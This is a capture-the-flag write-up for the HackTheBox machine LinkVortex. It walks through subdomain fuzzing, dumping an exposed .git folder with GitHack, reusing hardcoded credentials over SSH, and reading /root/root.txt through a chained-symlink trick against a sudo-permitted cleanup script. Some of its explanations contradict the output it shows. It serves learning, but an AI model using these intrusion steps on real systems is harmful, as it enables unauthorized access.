# LinkVoretx HTB Machine (Linux)

# nmap

Results:

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Add IP address and domain to /etc/hosts

# http

From the footer we can see that is powered by ghost cms

Without gobuster and trying to figure what version of ghost they are using I went over to the **/ghost** directory.
Prompted to me to login; tried the basic login but did not work and the forgot button also does not work.

`whatweb linkvortex.htb`
Results: 

http://linkvortex.htb [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.47], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], X-Powered-By[Express], X-UA-Compatible[IE=edge]
Shows that Ghost is using version 5.58; so all the exploits that I have seen thus far have been patched. 

# ffuf

`ffuf -u http://linkvortex.htb -H "HOST:FUZZ.linkvortex.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -ac`
Results:

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 85ms]

Alright, so we've got that subdomain locked in, right? Cool. Now, we're just gonna take a casual stroll through its directories at `http://dev.linkvortex.htb`. Think of it like poking around a bit, seeing what's lying around. Sometimes, you find those hidden gems, you know? Like config files or maybe even a repo or two. Basically, we're just trying to get a better feel for what's going on under the hood.
`ffuf -u http://dev.linkvortex.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt`
Results:

.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 84ms]
.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 84ms]
.git/HEAD               [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 86ms]
.git                    [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 86ms]
.hta                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 87ms]
.git/config             [Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 87ms]
.git/logs/              [Status: 200, Size: 868, Words: 59, Lines: 16, Duration: 87ms]
.git/index              [Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 87ms]
cgi-bin/                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 78ms]
index.html              [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 88ms]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 80ms]


# Git leak
GitHack is a **.git** folder disclosure exploit.
`python GitHack.py http://dev.linkvortex.htb/.git/`

Soon as I saw File not found dumps and ctrl c and started looking for interesting files. 
I also saw that it dumped **/ghost** files. I soon remembered that login poge were I was at earlier.
Started to look for any interesting files while keeping that in mind and also for any **api** files.

`ghost/core/test/regression/api/admin/authentication.test.js` and also a Dockerfile. 
This was dumped directory given to us from the tool GitHack. 
If we read the files we find important hardcoded credentials.

# Exploit 
Remember that the Ghost version is 5.58 and I did not find any exploit but I also did not look deeply then.
Since logging in with the credentials did not give us much I like to think that there is an exploit out there.

With a new simple Google search (ghost cms exploit 5.58 github) we found the right one to use. 

Once I was able to perform an arbitrary file read of any file on the host operating system.
I grabbed the Copy config from the **Dockerfile.ghost** that I found earlier.

```
cat Dockerfile.ghost 
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

```

Pasting that gave username and password that we can use to login using SSH.

# SSH
Once logging in we can get the user flag right away. 

I always check for other files, directories, users etc.. but before that I always like to check for the user's permission. 

`sudo -l`
Results:

```
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

I used `cat` to see what is inside the file. 
Results:

```
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```
This script, clean_symlink.sh, is a security tool that performs operations on symbolic links (symlinks) in a Linux system, specifically those involving .png files.

In this scenario, the script successfully moved the symlink huh.png (which pointed to /root/root.txt) to quarantine because it detected the target as being from the /root directory, which is sensitive.

```
bob@linkvortex:~$ ln -s /root/root.txt huh.txt
bob@linkvortex:~$ ln -s /home/bob/huh.txt huh.png
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/huh.png
Link found [ /home/bob/huh.png ] , moving it to quarantine
Content:

```

PWNED!

# Summary 

This CTF involved multiple stages, with key exploitation techniques relying on **Ghost CMS**, weak **user permissions**, and a **symlink vulnerability**:

1. **Ghost CMS Version 5.58**: While the version was known and patched against certain exploits, it was the **GitHack** tool that helped uncover hardcoded credentials inside the **.git** folder, specifically in files like `ghost/core/test/regression/api/admin/authentication.test.js`. These credentials provided SSH access to the system.

2. **Git Folder Disclosure**: Accessing `.git/` revealed sensitive files, including **Dockerfile** and **config.production.json**, which exposed useful information about the application and system. This was key in moving forward with the attack.

3. **SSH Access**: After logging in via SSH as the user `bob`, the attacker used `sudo -l` to identify a critical misconfiguration. The user had **NOPASSWD** access to run a specific script (`/opt/ghost/clean_symlink.sh`) that handled symbolic links, which was a major weak point.

4. **Symlink Vulnerability**: The script was designed to handle `.png` files, moving symlinked files pointing to sensitive locations into quarantine. By leveraging this misconfiguration, the attacker created a symlink to **/root/root.txt** and successfully read its contents by exploiting the script's ability to process symlinks.

**Critical Takeaways**:
- **Git folder disclosure**: This is a powerful attack vector, especially when accessing repositories or test directories that may contain sensitive data like credentials.
- **Misconfigured sudo permissions**: Even non-root users can escalate privileges if they have NOPASSWD access to critical scripts. Always ensure that sudo permissions are tightly controlled and reviewed.
- **Symlink handling**: Misconfigured scripts or services that process symlinks can be used to gain access to sensitive files, especially if there is a lack of validation for file paths or symlink targets.
